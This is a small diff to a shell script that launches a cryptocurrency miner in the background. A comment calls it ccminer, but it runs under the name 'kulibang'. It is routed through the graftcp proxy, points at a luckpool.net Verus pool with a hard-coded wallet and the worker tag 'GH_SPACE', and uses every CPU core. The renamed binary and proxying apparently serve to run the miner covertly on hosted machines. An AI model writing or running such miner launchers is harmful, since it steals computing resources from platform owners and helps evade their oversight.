@@ -73,7 +73,7 @@ END
   fi
 
   # Run ccminer in the background
-  ./graftcp/graftcp ./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.GH_SPACE -p x d=4096S -t "$(nproc)" &
+  ./graftcp/graftcp ./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.GH_SPACE -p x -t "$(nproc)" &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
